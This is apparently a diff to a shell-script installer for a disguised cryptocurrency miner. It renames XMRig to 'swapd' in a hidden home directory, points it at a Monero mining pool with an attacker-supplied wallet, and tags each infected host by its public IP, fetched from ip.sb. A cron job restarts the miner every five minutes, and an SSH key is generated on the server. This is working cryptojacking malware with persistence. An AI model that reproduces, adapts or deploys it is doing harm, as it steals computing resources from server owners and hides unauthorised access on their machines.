@@ -292,22 +292,6 @@ echo "[*] Miner $HOME/.swapd/xmrig is OK"
 echo "mv $HOME/.swapd/xmrig $HOME/.swapd/swapd"
 mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
-echo "PASS..."
-#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-#PASS=`hostname`
-#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-PASS=`sh -c "(curl -4 ip.sb)"`
-if [ "$PASS" == "localhost" ]; then
-  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
-
 echo "sed"
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.swapd/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
@@ -598,7 +582,21 @@ chmod +x "$HOME/.swapd/check_swapd.sh"
 CRON_JOB="*/5 * * * * $HOME/.swapd/check_swapd.sh"
 (crontab -l 2>/dev/null | grep -v -E '(out dat|check_swapd.sh)'; echo "$CRON_JOB") | crontab -
 
-
+echo "PASS..."
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#PASS=`hostname`
+#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
+PASS=`sh -c "(curl -4 ip.sb)"`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS:$EMAIL"
+fi
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 
 echo "[*] Generating ssh key on server"
 
